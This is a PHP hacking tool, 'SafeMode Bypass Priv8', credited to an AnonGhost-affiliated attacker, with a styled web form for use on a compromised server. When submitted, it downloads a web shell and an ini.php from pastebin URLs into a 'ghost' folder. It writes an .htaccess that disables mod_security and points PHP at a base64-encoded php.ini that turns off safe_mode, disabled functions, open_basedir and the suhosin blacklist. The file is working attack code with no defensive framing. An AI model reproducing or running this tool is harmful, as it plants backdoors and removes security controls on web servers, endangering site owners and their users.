<link href='http://fonts.googleapis.com/css?family=Orbitron:700' rel='stylesheet' type='text/css'>
<style type="text/css">
body {
background:
url("http://i.imgur.com/hg21xZ9.png") repeat , 
url("http://images3.alphacoders.com/142/142619.jpg") no-repeat center top,top left,top right;
background-color: green;
</style>
<font face='Orbitron'>

<?
error_reporting(0);
/*
#######################################
#SafeMode Bypass Priv8                #             
#Coded By Mauritania Attacker         #
#GreetZ To All AnonGhost MemberZ      #
#######################################  
*/


echo "<form method='POST'>
<title>Bypass SafeMode Priv8</title>
<center><pre><font color='green' face='Orbitron' size='6' face='Tahoma'>Bypass SafeMode Priv8</pre></font></center>
<center><font color='red' size='2' face='shell'>Cwd</font><input type='text' size='40' name='zero' value=".dirname(__FILE__)." <font color='green' size='8' face='Tahoma'></font></center>
<center><font color='red' size='2' face='shell'>Shell</font><input type='text' size='40' name='shell' value='http://pastebin.com/raw.php?i=2gmt5XFH' <font color='green' size='8' face='Tahoma'></font></center>
<center><font color='red' size='2' face='shell'>ini.php</font><input type='text' size='40' name='rim' value='http://pastebin.com/raw.php?i=sEbXwVvt' <font color='green' size='8' face='Tahoma'></font></center>
<p><center><input type='submit' value='Bypass SafeMode' name='start' <font color=red' face='Tahoma, Geneva, sans-serif' style='font-size: 12pt'><br></font></center></p>";
echo "<p><center><textarea rows='12' cols='60' style='font-family: impact size: 2pt ; color: green; border: 1px dotted red'>Results Will Appear Here ^_^ \n";
if($_POST['start']) {
$zero = $_POST['zero'];
$file = $_POST['shell'];
$mauritania = $_POST['rim'];
$htaccess = "<IfModule mod_security.c>
SecFilterEngine Off
SecFilterScanPOST Off
SecFilterCheckURLEncoding Off
SecFilterCheckCookieFormat Off
SecFilterCheckUnicodeEncoding Off
SecFilterNormalizeCookies Off
</IfModule>
<Limit GET POST>
order deny,allow
deny from all
allow from all
</Limit>
<Limit PUT DELETE>
order deny,allow
deny from all
</Limit>
SetEnv PHPRC $zero/ghost/php.ini";

$phpini = "c2FmZV9tb2RlID0gT0ZGDQpTYWZlX21vZGVfZ2lkID0gT0ZGDQpkaXNhYmxlX2Z1bmN0aW9ucyA9IE5PTkUNCmRpc2FibGVfY2xhc3NlcyA9IE5PTkUNCm9wZW5fYmFzZWRpciA9IE9GRg0Kc3Vob3Npbi5leGVjdXRvci5mdW5jLmJsYWNrbGlzdCA9IE5PTkU=";
$dir = "ghost"; 
		if(file_exists($dir)) {
			echo "[+] ghost Folder Already Exist are you drunk :o xD !\n";
		} else {
			@mkdir($dir); {
				echo "[+] ghost Folder Has Been Created Nygga :3 !\n";
		} }
	# Generate Sh3LL
	$fopen = fopen("ghost/priv8.php",'w');
	$shell = @file_get_contents($file);
	$swrite = fwrite($fopen ,$shell);
	if($swrite){
		echo "Shell Has Been Downloaded : $zero/ghost/priv8.php \n";
	} else {
		echo "Can't Download Shell :( do it manually :D \n";
	}
	fclose($fopen);
	# Generate Htaccess
	$kolsv = fopen("ghost/.htaccess", "w");
	$hwrite = fwrite($kolsv, $htaccess);
	if($hwrite){
		echo ".htaccess Generated Successfully \!/\n";
	} else {
		echo "Can't Generate Htaccess\n";
	}
	fclose($kolsv);
	# Generate ini.php
	$xopen = fopen("ghost/ini.php",'w');
	$rim = @file_get_contents($mauritania);
	$zzz = fwrite($xopen ,$rim);
	if($zzz){
		echo "ini.php Has Been Downloaded \!/\n";
	} else {
		echo "Can't Download ini.php :( do it manually :D \n";
	}
	fclose($xopen);
	
	$ini = fopen("ghost/php.ini" ,"w");
	$php = fwrite($ini, base64_decode($phpini));
		if($php){
			echo "PHP.INI Generated Successfully \!/";
		} else {
			echo "[-] Can't Generate PHP.INI";
		}
}
echo "</textarea></center></p><pre></pre>";
echo '<center><font color="#ee5500" size="3pt">Coded By Mauritania Attacker</font><br><font color="#ff8f00" size="1pt">GreetZ : AnonGhost - Teamp0ison - ZHC - Mauritania HaCker Team - 3xp1r3 Cyber Army - Robot Pirates - X-Blackerz INC. - Pak Cyber Pyrates - iMHATiMi.ORG</font></center>';

?>
